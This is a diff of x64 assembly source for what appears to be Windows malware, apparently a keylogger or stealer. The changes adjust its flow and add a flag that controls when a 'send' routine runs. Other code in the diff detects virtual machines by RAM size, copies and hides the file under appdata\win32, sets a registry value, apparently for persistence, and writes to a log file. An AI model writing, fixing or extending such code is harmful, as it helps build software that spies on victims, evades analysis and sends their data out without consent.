@@ -108,10 +108,12 @@ VK_LEFT equ 25h
 	lpnumst			db	40h dup(0)
 	lpsystime		db	20h dup(0)
 	lptest			db	'Yigit/testo.txt',0
+	rbit			db	0h
 
 
 
 .code
+
 
 numtostring proc ; rax num -- rbx string ptr
 	sub rsp, 20h
@@ -251,6 +253,8 @@ l470:
 	inc rbx
 	mov rax, 00747874h
 	mov qword ptr[rbx], rax ; MOV .TXT 
+
+	lea r12, lpFilePath
 
 	sub rsp, 20h
 	mov rcx, qword ptr[lpclose]
@@ -402,30 +406,11 @@ start		proc
 	sub		rsp, 28h
 
 
-
-
-	lea rcx, lpAppdata
-	lea rdx, lpTargetpath
-	mov r8, 300h
-	call GetEnvironmentVariableA
-
-	lea r8, lpTargetpath
-	lea r9, lpPcname
-	dec r9
-	add r8, 8h
-l481:
-	inc r8
-	inc r9
-	mov al, byte ptr[r8]
-	cmp al, '\'
-	je l491
-	mov byte ptr[r9],al 
-	jmp l481
-l491:
+;--aaa
 
 
 
-
+	;--- CHECK RAM SIZE TO ESCAPE VM ---
 
 	
 	lea rcx, ramsize
@@ -436,6 +421,7 @@ l491:
 	cmp r8, rdx
 	jl endl4
 
+	;--- CONTROL AM I IN RIGHT DIR ---
 
 	xor rcx, rcx
 	lea rdx, lpFilePath
@@ -469,15 +455,15 @@ l2:	mov al, byte ptr[rdx]
 
 	lea r8, lpTargetpath
 	lea r9, lpPcname
-	dec r9
+	sub r9, 2h
 	add r8, 8h
 l48:
 	inc r8
 	inc r9
-	
-	mov byte ptr[r9],al 
 	cmp al, '\'
-	je l49
+	je l49	
+	mov byte ptr[r9],al 
+
 	mov al, byte ptr[r8]
 	jmp l48
 l49:
@@ -512,6 +498,7 @@ l3:
 	cmp al, 0
 	jne l3
 
+	;--- DECISION TIME ---
 	lea rcx, lpTargetpath
 	lea rdx, lpFilePath
 l5:	mov al, byte ptr[rdx]
@@ -530,6 +517,8 @@ l4:
 ;------------------------------------
 
 ; This will work when u are not in appdata\win32
+
+	mov byte ptr[rbit], 1h
 
 	lea rdx, lpAppdatapath
 l10:
@@ -600,7 +589,7 @@ l12:
     call RegSetValueExA
 
 
-	jmp l60
+ 
 
 lmsgbox:
 		;Error messagebox
@@ -610,12 +599,9 @@ lmsgbox:
 	lea		rdx, msg
 	xor		ecx, ecx
 	call	MessageBoxA
-	jmp lrec1
 l60:
-	call send
-	jmp endl4
 
-lrec1:
+
 ;------------------------------------
 
 ; There will run after file copied to appdata\win32 and get hidden
@@ -644,7 +630,11 @@ l15:
 	cmp al, 0
 	jne l15
 
-	
+	mov al, byte ptr[rbit]
+	cmp al, 1h
+	je nosend1
+	call send
+nosend1:
 	
 	
 
